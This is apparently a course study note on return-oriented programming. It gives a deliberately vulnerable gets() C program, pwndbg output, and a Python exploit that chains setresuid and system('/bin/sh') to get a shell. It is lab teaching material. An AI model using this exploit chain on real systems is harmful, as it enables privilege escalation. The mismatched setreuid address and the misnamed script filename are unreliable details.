# ROP
- https://tc.gts3.org/cs6265/tut/tut06-01-rop.html
- https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#rop-gadgets
# Example
```c
// gcc -m32 -fno-stack-protector -D_FORTIFY_SOURCE=0 -z execstack -no-pie -o chall chall.c
#include <stdio.h>
void buf()
{
    char buffer[128];
    gets(buffer);
}
int main()
{
    buf();
    return 0;
}
```
## Solution
```bash
pwndbg> checksec
File:     /mnt/e/work/ctf/Udemy/Exploit_Development_Tutorial_for_Hackers_and_Pentesters/sec5/chall
Arch:     i386
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x8048000)
Stack:    Executable
RWX:      Has RWX segments
pwndbg> disassemble buf
Dump of assembler code for function buf:
   0x08049176 <+0>:     push   ebp
   0x08049177 <+1>:     mov    ebp,esp
   0x08049179 <+3>:     push   ebx
   0x0804917a <+4>:     sub    esp,0x84
   0x08049180 <+10>:    call   0x80491c0 <__x86.get_pc_thunk.ax>
   0x08049185 <+15>:    add    eax,0x2e7b
   0x0804918a <+20>:    sub    esp,0xc
   0x0804918d <+23>:    lea    edx,[ebp-0x88]
   0x08049193 <+29>:    push   edx
   0x08049194 <+30>:    mov    ebx,eax
   0x08049196 <+32>:    call   0x8049050 <gets@plt>
   0x0804919b <+37>:    add    esp,0x10
   0x0804919e <+40>:    nop
   0x0804919f <+41>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491a2 <+44>:    leave
   0x080491a3 <+45>:    ret
End of assembler dump.
pwndbg> b main
pwndbg> r
pwndbg> p setresuid
$1 = {int (uid_t, uid_t, uid_t)} 0xf7e58710 <__GI___setresuid>
pwndbg> p system
$2 = {int (const char *)} 0xf7dc1170 <__libc_system>
pwndbg> p exit
$3 = {void (int)} 0xf7db3460 <__GI_exit>
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
libc.so.6       0xf7f360d5 '/bin/sh'
pwndbg> rop --grep "pop e.. ; pop e.. ; pop e.. ; ret" -- --depth 4
Saved corefile /tmp/tmpwavgtsrz
0xf7fdaf81 : pop ebp ; pop edi ; pop ebx ; ret
0xf7fc4549 : pop ebp ; pop edx ; pop ecx ; ret
0xf7fc5478 : pop ebx ; pop esi ; pop ebp ; ret
0xf7fc70f0 : pop ebx ; pop esi ; pop edi ; ret
0xf7fc45a2 : pop esi ; pop edi ; pop ebp ; ret
0xf7fde6c0 : pop esi ; pop edi ; pop ebp ; ret 4
0xf7fd7303 : pop esi ; pop edi ; pop ebp ; ret 8
```

## explot1.py
```python
#!/usr/bin/env python3
from struct import pack
import sys
setreuid = 0xf7e91000
system = 0xf7dc1170
exit = 0xf7db3460
binsh = 0xf7f360d5
#0xf7fc70f0 : pop ebx ; pop esi ; pop edi ; ret
pop3ret = 0xf7fc70f0
payload = (
    b'A'*(0x88+4) +
    pack("<L", setreuid) + # setuid(1001, 1001, 1001)
    pack("<L", pop3ret) +
    pack("<L", 1001) +
    pack("<L", 1001) +
    pack("<L", 1001) +
    pack("<L", system) + # system("/bin/sh")
    pack("<L", exit) +  # exit(0x0101)
    pack("<L", binsh) +
    pack("<L", 0x0101)
)
sys.stdout.buffer.write(payload+b'\n')
```

## debug
```bash
pwndbg> set follow-fork-mode child
pwndbg> disassemble buf
 (snip)
pwndbg> b *buf+45
Breakpoint 1 at 0x80491a3
pwndbg> ! ./exploit1.py >payload
pwndbg> r <payload 
```
